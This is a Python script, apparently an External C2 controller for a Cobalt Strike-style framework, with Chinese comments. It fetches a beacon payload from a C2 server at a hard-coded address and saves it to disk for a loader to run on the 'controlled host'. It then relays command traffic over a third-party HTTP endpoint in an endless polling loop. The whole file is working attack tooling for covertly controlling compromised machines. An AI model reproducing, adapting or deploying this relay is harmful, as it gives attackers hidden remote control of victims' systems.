import socket
import struct
import requests
# import random
import time

PAYLOAD_MAX_SIZE = 512 * 1024
BUFFER_MAX_SIZE = 1024 * 1024


def tcpconnect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    return s


def recvdata_unpack(s):
    chunk = s.recv(4)
    slen = struct.unpack("<I", chunk)[0]
    recvdata = s.recv(slen)
    print("recvdata_unpack: " + str(slen))
    # print(recvdata)
    return recvdata


def senddata_pack(s, data):
    slen = struct.pack("<I", len(data))
    s.sendall(slen+data)
    print("senddata_pack: " + str(len(data)))
    # print(data)
    return


def droppaylod(data):
    # filename = random.choice(["a", "b", "c", "d"]) + str(random.randint(1000, 9999)) + ".bin"
    filename = "payload.bin"
    with open("payload/" + filename, "wb") as fp:
        fp.write(data)
    return filename


def requestpayload(s, arch, pipename, block):
    senddata_pack(s, ("arch=" + arch).encode("utf-8"))
    senddata_pack(s, ("pipename=" + pipename).encode("utf-8"))
    senddata_pack(s, ("block=" + str(block)).encode("utf-8"))
    senddata_pack(s, "go".encode("utf-8"))
    #为什么必须这么写，原因需要深究
    try:
        chunk = s.recv(4)
    except:
        return ""
    if len(chunk) < 4:
        return ()
    slen = struct.unpack('<I', chunk)[0]
    chunk = s.recv(slen)
    while len(chunk) < slen:
        chunk = chunk + s.recv(slen - len(chunk))
    return chunk


def read_http(req, url):
    # res = req.get(url + "?action=read",proxies={"http": "http://127.0.0.1:8080"})
    res = req.get(url + "?action=read")
    print("read from http: " + str(len(res.content)))
    # print(res.content)
    return res.content


def write_http(req, url, data):
    print("write to http: " + str(len(data)))
    length = struct.pack("<I", len(data))
    data = length + data
    # print(data)
    # req.post(url + "?action=write", data=data, proxies={"http": "http://127.0.0.1:8080"})
    req.post(url + "?action=write", data=data)
    return


# 轮询函数
def ctrl_loop(s, req, url):
    while True:
        data = read_http(req, url)
        senddata_pack(s, data)
        recvdata = recvdata_unpack(s)
        write_http(req, url, recvdata)
        #必要的延迟，否则会出错
        time.sleep(3)



def main():
    # externalc2服务的IP和端口
    ip = "192.168.112.137"
    port = 2222
    soc = tcpconnect(ip, port)

    # 请求payload
    payloaddata = requestpayload(soc, "x64", "hltest", 1000)
    paylaodfile = droppaylod(payloaddata)

    print("paylaod文件名为： " + paylaodfile)
    print("请使用loader在被控端执行payload")
    r = requests.session()
    while True:
        url = input("请输入第三方客户端地址：")
        res = r.get(url)
        if not res.text == 'OK':
            print("第三方客户端有问题，请查看。")
        else:
            break

    ctrl_loop(soc, r, url)


if __name__ == '__main__':
    main()
